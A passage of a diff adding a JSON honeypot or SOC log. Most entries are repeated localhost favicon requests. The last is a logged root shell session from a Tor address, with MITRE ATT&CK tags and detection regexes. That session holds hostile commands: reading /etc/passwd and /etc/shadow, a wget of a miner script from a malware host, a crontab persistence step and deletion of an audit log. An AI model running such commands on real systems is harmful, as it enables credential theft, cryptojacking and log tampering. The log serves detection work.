+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233981-63977",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:19:41.275479+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794233991-60008",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:19:51.313104+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234001-58909",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:20:01.354593+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234011-54287",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:20:11.398113+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234021-50238",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:20:21.439116+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234031-52060",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:20:31.478875+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234041-54792",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:20:41.520019+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234051-58529",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:20:51.552247+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234061-57840",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:21:01.582599+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234071-64119",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:21:11.623911+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234081-65058",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:21:21.661264+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234091-60946",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:21:31.710873+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234101-50619",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:21:41.747423+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234111-58173",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:21:51.793016+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234121-59158",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:22:01.841093+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234131-64166",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:22:11.895947+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234141-59156",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:22:21.923429+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234151-59176",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:22:31.965204+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234162-59225",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:22:42.012448+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "web-get-1794234172-61739",
+    "type": "web_probe",
+    "timestamp": "2026-11-09T14:22:52.046728+00:00",
+    "source_ip": "127.0.0.1",
+    "geo": {
+      "country": "Réseau Local / Privé",
+      "country_code": "LAN",
+      "city": "Intranet",
+      "isp": "Local Network (RFC 1918)",
+      "threat_level": "Interne"
+    },
+    "method": "GET",
+    "path": "/favicon.ico",
+    "headers": {
+      "Host": "localhost:8080",
+      "Connection": "keep-alive",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
+      "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Google Chrome\";v=\"157\", \"Chromium\";v=\"157\"",
+      "sec-ch-ua-mobile": "?0",
+      "Accept": "image/jxl,image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
+      "Sec-Fetch-Site": "same-origin",
+      "Sec-Fetch-Mode": "no-cors",
+      "Sec-Fetch-Dest": "image",
+      "Referer": "http://localhost:8080/_soc",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6"
+    },
+    "mitre_alerts": []
+  },
+  {
+    "session_id": "shell-1794234171-48210",
+    "type": "shell",
+    "timestamp": "2026-11-09T14:22:51.555357+00:00",
+    "source_ip": "185.220.101.5",
+    "source_port": 48210,
+    "geo": {
+      "country": "Allemagne (Tor Exit Node)",
+      "country_code": "DE",
+      "city": "Frankfurt",
+      "isp": "Tor Anonymity Router",
+      "threat_level": "Tor"
+    },
+    "auth": {
+      "username": "root",
+      "password": "toor123"
+    },
+    "commands": [
+      {
+        "time": "15:22:51",
+        "command": "whoami",
+        "mitre": [
+          "T1033"
+        ]
+      },
+      {
+        "time": "15:22:51",
+        "command": "uname -a",
+        "mitre": [
+          "T1082"
+        ]
+      },
+      {
+        "time": "15:22:52",
+        "command": "cat /etc/passwd",
+        "mitre": [
+          "T1003"
+        ]
+      },
+      {
+        "time": "15:22:52",
+        "command": "cat /etc/shadow",
+        "mitre": [
+          "T1003"
+        ]
+      },
+      {
+        "time": "15:22:52",
+        "command": "wget http://c2-malware.darknet.ru/miner.sh",
+        "mitre": [
+          "T1105",
+          "T1059"
+        ]
+      },
+      {
+        "time": "15:22:52",
+        "command": "chmod +x miner.sh",
+        "mitre": [
+          "T1222",
+          "T1059"
+        ]
+      },
+      {
+        "time": "15:22:52",
+        "command": "crontab -e",
+        "mitre": [
+          "T1053"
+        ]
+      },
+      {
+        "time": "15:22:53",
+        "command": "rm -rf /var/log/audit.log",
+        "mitre": [
+          "T1070"
+        ]
+      }
+    ],
+    "mitre_alerts": [
+      {
+        "id": "T1033",
+        "name": "System Owner/User Discovery",
+        "tactic": "Discovery",
+        "pattern": "\\b(whoami\\b|id\\b|\\bw\\b|\\bwho\\b|last\\b|groups\\b)\\b",
+        "severity": "LOW",
+        "desc": "Identification des privilèges de la session courante et des utilisateurs connectés"
+      },
+      {
+        "id": "T1082",
+        "name": "System Information Discovery",
+        "tactic": "Discovery",
+        "pattern": "\\b(uname\\s+-[ar]|cat\\s+/etc/.*release|lscpu\\b|hostname\\b|uptime\\b|systeminfo\\b)\\b",
+        "severity": "MEDIUM",
+        "desc": "Reconnaissance de l'architecture, du noyau Linux et de la distribution hôte"
+      },
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "pattern": "(cat\\s+/etc/(passwd|shadow)|grep\\s+.*shadow|unshadow|mimikatz|id_rsa|\\.aws/credentials|\\.docker/config)",
+        "severity": "CRITICAL",
+        "desc": "Tentative d'extraction de comptes, clés privées ou hashs de mots de passe système"
+      },
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "tactic": "Credential Access",
